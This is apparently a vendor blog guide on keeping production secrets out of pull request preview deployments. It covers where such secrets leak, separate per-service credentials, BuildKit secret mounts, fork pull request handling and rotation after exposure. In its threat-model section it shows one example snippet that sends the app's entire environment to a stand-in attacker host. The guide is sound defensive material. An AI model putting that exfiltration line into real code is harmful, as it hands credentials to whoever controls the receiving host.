---
title: Preview environment secrets: keeping production credentials out of pull request previews
description: Preview environment secrets done right: why pull request previews should never see production credentials, and what to give them instead.
date: 2026-11-11
tags: security, preview-deployments, secrets, docker, guides
---

Pull request previews are useful because they run the real app with the real code from a branch. That's also the risk. A preview runs code that hasn't been reviewed yet, so that code can read any credential the preview has. Handling preview environment secrets well comes down to one rule: a preview gets its own credentials, never production's. This guide explains why the rule matters, where secrets tend to leak, and how to give previews safe credentials that still let them work.

If you haven't set up previews yet, start with [Pull request preview deployments](/blog/pr-preview-deployments). For how environment variables work in general, see [Managing environment variables and secrets](/blog/environment-variables-secrets-management).

## Why a preview sits at a different trust level

Your production deploy runs code that went through review and got merged. A preview runs whatever is on the branch right now. That could be a half-finished refactor or a dependency someone added an hour ago. It could also be a change from someone you don't know well.

Look at it from an attacker's side. If a preview gets your production database URL, anyone who can get code into a previewed branch can read that URL. It doesn't take much:

```js
// Anywhere in the app, or in a postinstall script of a new dependency
fetch("https://attacker.example/collect", {
  method: "POST",
  body: JSON.stringify(process.env),
});
```

Code review doesn't protect you here. The preview is built and started before anyone reviews the change, because that's what a preview is for. The risky code also doesn't have to be in your repository. If a branch pulls in a compromised package, that package runs during the install step with the same access.

So the useful question isn't "do we trust our contributors?" It's "what's the worst that can happen if this branch is hostile?" If the answer is "they get a throwaway database and a test-mode payments key", you're in good shape.

## Where preview secrets leak

Environment variables read at runtime are the obvious path, but there are others. These leaks come up most often:

- **Runtime environment.** The app can read anything in the container's environment, and so can every dependency it loads.
- **Build arguments baked into the image.** If a value passed with `--build-arg` is used in a `RUN` step or copied into an `ENV`, the image records it. `docker history` and the image metadata can show it, and the image stays on the server after the preview is gone.
- **Client-side bundles.** At build time, frameworks inline some variables into the JavaScript sent to the browser. Next.js does this for anything prefixed `NEXT_PUBLIC_`, and Vite does it for anything prefixed `VITE_`. A secret with the wrong prefix ends up in a public file.
- **Build and app logs.** A debug line that prints the config, or a stack trace that includes a connection string, writes the secret to the logs. Think about who can read preview logs and where those logs get shipped.
- **The preview URL itself.** Often anyone who has the link, or guesses it, can open a preview. A debug page or a verbose error page shows whatever it renders.

Blocking every one of these paths is hard. Making sure there's nothing valuable to leak is much easier, so the rest of this guide is about separate credentials.

## The rule: previews get their own credentials

For each external service your app talks to, decide what previews should use in place of the production credential. Here are the usual categories.

### Database

Never point a preview at the production database, not even with a read-only user. Read-only access to production data is still a data leak.

Better options, from simplest to most realistic:

1. A fresh database for each preview. It starts empty, and your migrations and a seed script fill it.
2. A shared staging database that only previews and staging use.
3. A sanitized copy of production with personal data removed or replaced, refreshed on a schedule.

The first option is the safest and is often good enough. The third gives the most realistic data, but you then have a sanitizing step to maintain. If you go that way, treat the export script as security-sensitive code and review every change to it.

### Payments and third-party APIs

Most payment providers have a test mode with separate keys. Stripe, for example, issues test keys that start with `sk_test_`, and they can't move real money. Previews should only ever get test-mode keys.

For other APIs, create a separate key or a separate project with the provider. Scope it as narrowly as the provider allows, and set low rate limits if you can. With a separate key, you can also revoke it without touching production.

### Email, SMS, and other outbound messages

A preview with production email credentials can send real email to real users, by mistake or on purpose. Use a sandbox instead. Many email providers offer one, or you can run a local capture tool such as Mailpit and point the preview's SMTP settings at it. Do the same for SMS and push notifications: use test credentials, or turn sending off in previews.

### Authentication and session secrets

If a preview shares your production session signing key or JWT secret, a token created in a preview could be valid in production. Give previews their own signing secrets.

For OAuth logins, register a separate OAuth app for previews with its own client ID and secret. That way, preview callback URLs stay out of your production app's list of allowed redirects.

### Object storage

Give previews their own bucket, or a prefix with credentials limited to that prefix. A preview with production storage credentials can read user uploads, and it can delete them too.

### Webhooks and background jobs

Some side effects don't involve an obvious secret. A preview that runs your production cron jobs, or registers itself as a webhook receiver with a third-party service, can cause real trouble. Turn off scheduled jobs in previews, or point them only at preview resources. For how scheduled work runs on a self-hosted server, see [Scheduled tasks and background jobs](/blog/scheduled-tasks-background-jobs-self-hosted).

## Keep secrets out of the image

Even with separate credentials, it's worth building images that contain no secrets at all. The same Dockerfile builds production, so a habit that leaks in previews leaks in production too.

If your build needs a secret, such as a token for a private package registry, use a BuildKit secret mount, not a build argument:

```dockerfile
# syntax=docker/dockerfile:1
FROM node:20-alpine
WORKDIR /app
COPY package.json package-lock.json ./
RUN --mount=type=secret,id=npm_token \
    NPM_TOKEN="$(cat /run/secrets/npm_token)" npm ci
COPY . .
RUN npm run build
```

```bash
docker build --secret id=npm_token,env=NPM_TOKEN -t myapp .
```

The secret is only available during that one `RUN` step, and it isn't written into a layer. With `ARG NPM_TOKEN`, the value can end up in the image history.

To check an existing image, look at its history and environment:

```bash
docker history --no-trunc myapp:latest
docker inspect --format '{{json .Config.Env}}' myapp:latest
```

If either output shows a real credential, rotate it. Removing it from the Dockerfile doesn't remove it from images that were already built.

Check client-side variables too. Search your codebase for `NEXT_PUBLIC_` and `VITE_`, and make sure each value is something you'd be fine publishing.

## Decide who can trigger a preview

The fewer people who can get code into a previewed branch, the smaller the risk. This matters most for public repositories, where anyone can open a pull request from a fork.

CI systems have dealt with this for years. GitHub Actions, for example, doesn't pass repository secrets to workflows triggered by pull requests from forks, because fork code is untrusted. Its `pull_request_target` trigger does run with secrets, which is why it often causes leaks when it's used to build fork code.

Pushify takes the same approach. When a pull request comes from a fork, Pushify doesn't create a preview, and the webhook response says "Preview not created: fork PR ignored". The check fails closed: if the head repository is missing or was deleted, Pushify treats the pull request as a fork. GitLab merge requests work the same way. If the source and target project IDs differ, or either one is missing, the merge request is ignored. The reason is the one this guide is about: a preview runs with the project's environment variables, so running fork code in it would hand those variables to whoever opened the pull request. There's no per-project setting to allow fork previews.

So in practice, Pushify creates previews only for branches pushed to the connected repository itself. Your trust boundary is the list of people with push access. Keep that list short. A compromised account or a malicious dependency can still get code into a branch, so you still need separate preview credentials.

## Where previews run

With Pushify, a preview is built and run on the same server as the project's production app. It gets its own container, its own port, and its own vhost named `<slug>-pr-<n>`, but it shares the machine. Pushify currently has no setting to send previews to a different server. For how builds happen on the target server, see [From git push to live](/blog/how-zero-downtime-deploys-work).

That changes how you should think about the risk. Docker isolates containers from each other by default. A preview container can't see production's filesystem or volumes unless something mounts them into it. But the two still share the host's CPU, memory, disk, and network. A preview that uses up memory or fills the disk can slow down or break production. The branch's build scripts also run on that same machine.

In practice, that means:

- Separate credentials matter even more. The preview is already sitting next to production, so it shouldn't also be holding production's keys.
- Leave headroom on the production server for the previews you expect to have open at once.
- Watch disk usage. Preview images and build cache add up over time.

If you're choosing a server size or type for a project that will use previews, [BYOS vs managed](/blog/byos-vs-managed-servers) covers the tradeoffs.

## Setting this up in Pushify

Preview deployments come with the paid plans. Once they're on, most of the work is environment variables. It helps to know how Pushify combines them.

Each environment variable in Pushify belongs to one environment: `production`, `staging`, `development`, or `preview`. A preview deploy starts with the production variables. Then any preview variable with the same key replaces the production value. A production deploy gets only production variables, so preview values never flow the other way. Development variables are never injected into any deploy.

The important consequence is this: **every production variable you don't override still reaches the preview.** Separation only happens for keys you've explicitly redefined.

1. List every production variable. Mark each one as safe to share (for example `NODE_ENV` or a public site name) or sensitive.
2. For each sensitive variable, create the preview equivalent described above: a preview database, test-mode payment keys, a mail sandbox, separate signing secrets, and so on.
3. Add each one as a `preview` variable with exactly the same key as the production variable. If the key is different, even slightly, the production value still goes through.
4. If you linked a database under Databases → Connect, that connection isn't passed to previews at all. The preview deploy log will tell you to set a separate `DATABASE_URL` under preview variables. Set it, and point it at your preview database.
5. Open a test pull request and check what the preview actually got. A temporary debug endpoint is enough, as long as it prints only variable names or the hostnames in connection strings. Don't print full values, and remove the endpoint afterwards.

Make one more habit part of your process. When you add a new sensitive production variable, add its preview override at the same time. Otherwise the next preview deploy picks up the production value automatically.

If you keep secrets in a dedicated manager like Infisical, Doppler, or Vault, give previews their own environment there too. Use a token that can only read preview secrets. [Self-hosted secrets management](/blog/self-hosted-secrets-management-doppler-infisical-vault) compares those options.

## If a production secret already reached a preview

It happens, usually because someone copied a `.env` file, added a variable in a hurry, or forgot to override a key. Treat the secret as exposed:

1. Rotate the secret in production first. Then add or fix the preview override so the new value doesn't reach previews either.
2. Remove any preview images built with the old value, since it may be in their history.
3. Check the affected service's access logs for activity you don't recognize, starting from when the preview first received the secret.
4. Find out how it got there, and close that path so it doesn't happen again.

Rotating a secret that "probably" didn't leak can feel like overkill. It's still cheaper than finding out later that it did.

## A short checklist

- Every sensitive production variable has a `preview` override with the same key.
- New production secrets get their preview override when they're added.
- Previews never receive production database URLs, API keys, signing secrets, or storage credentials.
- Every external service has a preview-specific credential, test mode, or sandbox.
- Scheduled jobs and outbound messages are turned off or sandboxed in previews.
- Build secrets use BuildKit secret mounts, not build arguments.
- Client-side variables (`NEXT_PUBLIC_`, `VITE_`) contain nothing secret.
- Push access to the repository is limited to people who need it, since fork pull requests don't get previews.
- The production server has headroom for the previews that share it.
- You've checked a real preview to confirm what it received.

None of this makes previews less useful. A preview with a seeded database and test-mode keys still shows reviewers what a branch looks like and how it behaves. It just can't hurt production when something unexpected turns up in that branch. For the wider security picture, see [Securing a self-hosted PaaS](/blog/self-hosted-paas-security).
